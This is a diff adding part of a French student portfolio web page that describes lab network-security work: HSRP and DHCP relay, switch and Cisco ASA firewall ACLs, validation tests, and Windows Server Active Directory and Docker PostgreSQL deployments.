+                    SR1 est configuré avec une priorité de 105 et la preemption activée, ce qui
+                    le désigne comme routeur actif préféré et lui permet de reprendre ce rôle
+                    automatiquement après une panne :
+                </p>
+                <pre><code>! SR1_siege — routeur actif préféré (priorité 105)
+interface Vlan10
+ mac-address 0001.976d.b901     ! MAC fixe pour stabiliser les tables ARP
+ ip address 192.168.10.2 255.255.255.0
+ ip helper-address 192.168.10.10 ! Relais DHCP vers Windows Server
+ standby 10 ip 192.168.10.1     ! IP virtuelle = passerelle des clients
+ standby 10 priority 105        ! > 100 (défaut SR2) → SR1 actif
+ standby 10 preempt             ! Reprend le rôle actif au retour
+
+! SR2_siege — routeur standby (priorité par défaut 100)
+interface Vlan10
+ mac-address 0002.976d.b901
+ ip address 192.168.10.3 255.255.255.0
+ ip helper-address 192.168.10.10
+ standby 10 ip 192.168.10.1
+ standby 10 priority 100</code></pre>
+                <p>
+                    La directive <code>ip helper-address 192.168.10.10</code> sur chaque
+                    interface VLAN convertit les broadcasts DHCP des clients (UDP port 67)
+                    en unicast vers le Windows Server (192.168.10.10), permettant à un seul
+                    serveur DHCP centralisé de servir tous les VLANs. Le champ
+                    <em>giaddr</em> de la requête DHCP relayée contient l'adresse de l'interface
+                    SVI entrante, ce qui permet au serveur DHCP d'identifier le VLAN d'origine
+                    et de répondre avec une adresse du scope correspondant.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC21.02 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC21.02 | Configurer et expliquer une politique simple de QoS et la sécurité d'un réseau
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai conçu et configuré une politique de sécurité réseau en deux couches :
+                    ACLs stateful sur les switchs L3 et ACLs sur les pare-feux Cisco ASA avec
+                    filtrage stateful ICMP.
+                </p>
+
+                <p><strong>1. Couche 1 — ACL BLOCK_SERVICE_PROD sur switch L3 (whitelist stateful)</strong></p>
+                <p>
+                    Cette ACL, appliquée en direction <em>in</em> sur les interfaces VLAN20 et
+                    VLAN30 des deux switchs SR1 et SR2, adopte une politique whitelist stricte.
+                    Les mots-clés <code>established</code> et <code>echo-reply</code> permettent
+                    uniquement les réponses à des connexions initiées par Admin, jamais les
+                    initiations depuis Service ou Production :
+                </p>
+                <pre><code>ip access-list extended BLOCK_SERVICE_PROD
+ permit ospf any any                               ! OSPF non bloqué
+ permit ip   192.168.10.0 0.0.0.255 any           ! Admin gauche : accès total
+ permit ip   192.168.11.0 0.0.0.255 any           ! Admin droit  : accès total
+ permit tcp  any 192.168.10.0 0.0.0.255 established ! Réponses TCP → Admin gauche
+ permit tcp  any 192.168.11.0 0.0.0.255 established ! Réponses TCP → Admin droit
+ permit icmp any 192.168.10.0 0.0.0.255 echo-reply  ! Réponses ping → Admin gauche
+ permit icmp any 192.168.11.0 0.0.0.255 echo-reply  ! Réponses ping → Admin droit
+ deny   ip   any any                               ! Tout le reste bloqué
+
+! Application sur les VLANs Service et Production
+interface Vlan20
+ ip access-group BLOCK_SERVICE_PROD in
+interface Vlan30
+ ip access-group BLOCK_SERVICE_PROD in</code></pre>
+
+                <p><strong>2. Couche 2 — ACLs ASA et inspect icmp stateful</strong></p>
+                <p>
+                    Le pare-feu ASA gère trois ACLs nommées. La règle fondamentale :
+                    Admin a un <code>permit ip any</code>, tout le reste se termine par
+                    <code>deny ip any any</code>. L'instruction <code>inspect icmp</code>
+                    maintient un état des sessions ICMP : une réponse ping est autorisée
+                    uniquement si la requête initiale provenait d'Admin. Un ping initié
+                    par Service est bloqué car l'ASA ne trouve aucune session correspondante.
+                </p>
+                <pre><code>! FIREWALL-1 — INSIDE_IN (trafic LAN → ASA)
+access-list INSIDE_IN extended permit ip 192.168.10.0 255.255.255.0 any ! Admin : tout
+access-list INSIDE_IN extended deny   ip any any
+
+! FIREWALL-1 — OUTSIDE_IN (trafic WAN/tunnel → ASA)
+access-list OUTSIDE_IN extended permit tcp any host 192.168.40.2 eq www   ! HTTP DMZ
+access-list OUTSIDE_IN extended permit tcp any host 192.168.40.2 eq 443   ! HTTPS DMZ
+access-list OUTSIDE_IN extended permit udp any host 192.168.40.2 eq 53    ! DNS DMZ
+access-list OUTSIDE_IN extended permit ip 192.168.11.0 255.255.255.0 192.168.10.0 255.255.255.0
+access-list OUTSIDE_IN extended permit icmp any 192.168.10.0 255.255.255.0 echo-reply
+access-list OUTSIDE_IN extended deny   ip any any
+
+! inspect icmp — filtrage stateful ICMP
+class inspection_default
+ inspect icmp
+service-policy global_policy global</code></pre>
+
+                <p><strong>3. Matrice de conformité validée</strong></p>
+                <pre><code>Trafic                         Résultat   Mécanisme
+Admin → tous réseaux           Autorisé   permit ip Admin any
+Admin ↔ Admin inter-sites      Autorisé   OUTSIDE_IN inter-Admin
+Admin ping Service → réponse   Autorisé   echo-reply + inspect icmp
+Admin → DMZ locale/distante    Autorisé   INSIDE_IN + OUTSIDE_IN
+Service initie ping → Admin    Bloqué     ACL switch deny ip any any
+Service → DMZ                  Bloqué     INSIDE_IN deny any any
+Production → Admin             Bloqué     ACL switch deny ip any any</code></pre>
+            </div>
+        </details>
+
+        <!-- AC21.03 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC21.03 | Déployer des postes clients et des solutions virtualisées adaptées à une situation donnée
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai participé au déploiement et à la configuration de l'ensemble de
+                    l'infrastructure sous Cisco Packet Tracer et sur VMs Linux Ubuntu pour les
+                    spécialisations.
+                </p>
+
+                <p><strong>1. Configuration des Cisco ASA 5506-X</strong></p>
+                <p>
+                    Les pare-feux ASA représentent l'équipement le plus complexe à configurer
+                    dans ce projet, avec un modèle de sécurité différent des équipements IOS :
+                    les zones sont définies par <code>nameif</code> et <code>security-level</code>,
+                    et tout le filtrage repose sur des ACLs nommées et la <code>service-policy</code>
+                    d'inspection. La configuration complète de FIREWALL-1 comprend les interfaces,
+                    les ACLs INSIDE_IN / OUTSIDE_IN / DMZ_IN, la politique d'inspection globale
+                    et le routage OSPF.
+                </p>
+                <pre><code>! FIREWALL-1 — configuration des zones
+interface GigabitEthernet1/1
+ nameif outside
+ security-level 100
+ ip address 172.16.1.1 255.255.255.0
+interface GigabitEthernet1/2
+ nameif inside
+ security-level 100
+ ip address 172.16.0.2 255.255.255.0
+interface GigabitEthernet1/3
+ nameif DMZ
+ security-level 100
+ ip address 192.168.40.1 255.255.255.0
+
+! Application des ACLs sur les interfaces
+access-group INSIDE_IN  in interface inside
+access-group OUTSIDE_IN in interface outside
+access-group DMZ_IN     in interface DMZ
+
+! Service policy d'inspection (ICMP stateful, DNS, FTP, TFTP)
+policy-map global_policy
+ class inspection_default
+  inspect dns preset_dns_map
+  inspect ftp
+  inspect icmp
+  inspect tftp
+service-policy global_policy global</code></pre>
+
+                <p><strong>2. Postes clients Packet Tracer — VLANs et tests</strong></p>
+                <p>
+                    Les postes clients (PC-PT) sont configurés avec les adresses des VLANs
+                    correspondants et les DNS pointant vers le serveur DMZ local. Les tests de
+                    validation confirment le bon fonctionnement de la politique de sécurité :
+                    les postes Admin peuvent pinguer tous les réseaux, accéder aux DMZ et
+                    résoudre les noms ; les postes Service et Production ne peuvent initier
+                    aucune connexion vers d'autres VLANs, la DMZ ou internet.
+                </p>
+                <pre><code>! PC admin — configuration
+IP     : 192.168.10.x/24
+GW     : 192.168.10.1
+DNS    : 192.168.40.2  (DMZ SERVER 1)
+
+! Vérifications depuis admin
+ping 192.168.40.2                    ! DMZ locale → succès
+ping 192.168.41.2                    ! DMZ distante → succès
+nslookup dmz1.entreprise.local       ! → 192.168.40.2
+nslookup dmz2.entreprise.local       ! → 192.168.41.2
+https://dmz1.entreprise.local        ! Page web HTTPS → cadenas visible
+https://dmz2.entreprise.local        ! Page web HTTPS inter-sites → succès</code></pre>
+
+                <p><strong>3. VMs Linux Ubuntu — spécialisations individuelles</strong></p>
+                <p>
+                    Les quatre spécialisations ont été réalisées sur VMs Linux Ubuntu distinctes.
+                    Ma spécialisation (sécurisation HTTP → HTTPS) a été déployée sur la VM
+                    de IP 192.31.25.16 avec Apache2, OpenSSL, et la configuration
+                    <code>default-ssl.conf</code>. La spécialisation DNSSEC (Matisse Rudiger)
+                    a utilisé BIND9 avec <code>dnssec-keygen</code> et <code>dnssec-signzone</code>
+                    sur une VM distincte (192.31.25.18). Les tests STP (Antoine Grevin) ont été
+                    réalisés directement dans Packet Tracer avec le switch SW-A. La spécialisation
+                    ANSSI (Adam Duponchelle) a produit la checklist complète documentée dans le
+                    Write Up.
+                </p>
+
+                <p><strong>4. Tableau de validation finale</strong></p>
+                <pre><code>Fonctionnalité                  Statut       Preuve
+VLANs Admin/Service/Production  Opérationnel show interfaces vlan SR1/SR2
+ACL stateful switch L3          Opérationnel Service ne peut pas initier vers Admin
+Tunnel GRE R1 ↔ R3              Opérationnel Tunnel0 is up, line protocol is up
+OSPF inter-sites                Opérationnel show ip route — routes O E2 visibles
+HTTP/HTTPS DMZ locale           Opérationnel https://192.168.40.2 — cadenas visible
+HTTP/HTTPS DMZ inter-sites      Opérationnel https://192.168.41.2 depuis site gauche
+Blocage Service et Production   Opérationnel deny ip any any — ping Service bloqué
+DNS local Admin                 Opérationnel nslookup dmz1.entreprise.local
+DNS inter-sites Admin           Opérationnel nslookup dmz2.entreprise.local
+DNSSEC zone signée              Démontré     dig +dnssec — RRSIG présent, flag ad
+Redirection HTTP → HTTPS        Démontré     Redirect permanent port 80 → 443
+Attaque STP documentée          Démontré     SW-A élu Root Bridge, BPDU Guard recommandé</code></pre>
+
+                <p><strong>5. Windows Server 2022, Active Directory et Docker — SAÉ 3.Cyber.03</strong></p>
+                <p>
+                    Dans la <strong>SAÉ 3.Cyber.03 – Concevoir un réseau informatique sécurisé
+                    multi-sites</strong>, j'ai déployé des solutions virtualisées plus complètes :
+                    un Windows Server 2022 multi-rôles et une base de données PostgreSQL sous Docker.
+                </p>
+                <p>
+                    <strong>Windows Server 2022 — quatre rôles simultanés :</strong> Le serveur
+                    (192.168.10.10/24, VLAN Admin) assure le <em>DHCP</em> avec 10 scopes couvrant
+                    les 5 VLANs des 2 bâtiments (options 003 passerelle HSRP, 006 DNS, 015 domaine),
+                    le <em>DNS</em> avec la zone <code>societetemaqam.pepiniere.rt</code>, l'<em>Active
+                    Directory</em> avec le domaine AD et les GPOs, et le <em>proxy WinGate</em>
+                    relayé vers le Squid de l'IUT.
+                </p>
+                <p>
+                    <strong>Active Directory et GPOs :</strong> Le domaine comprend deux utilisateurs
+                    (<em>locAdmin</em> dans le groupe 10_Admin, <em>maurice</em> dans le groupe
+                    20_Personnel), deux groupes de machines (AdminPCs, WorkstationPCs) et trois GPOs :
+                </p>
+                <pre><code>GPO Proxy_settings          → configure WinGate (192.168.10.10:3128) sur tous les postes
+GPO Logon_mount_Partage     → monte \192.168.10.10\Partage_Personnel$ en Z: au logon
+GPO Restrictions_AdminPCs   → restreint la connexion locale aux membres de 10_Admin uniquement</code></pre>
+                <p>
+                    <strong>Base de données PostgreSQL sous Docker :</strong> Un conteneur Docker
+                    Compose déploie PostgreSQL avec un volume persistant (<code>prod_data</code>),
+                    un réseau bridge isolé (<code>app_network</code>) et un script d'initialisation
+                    automatique (<code>init_prod.sh</code> dans <code>/docker-entrypoint-initdb.d/</code>)
+                    qui crée la base <code>sae24</code>, les tables (<code>users</code>,
+                    <code>product</code>, <code>cart_item</code>) et un utilisateur de réplication
+                    dédié avec droit <code>REPLICATION LOGIN</code>.
+                </p>
+            </div>
+        </details>
+
+    </div>
+</details>
+
+</div>
+
+<footer>
+<p>
+© 2026 Mon Portfolio. Tous droits réservés.
+<a href="mentions.html">Mentions légales</a>
+</p>
+</footer>
+
+</body>
+</html>
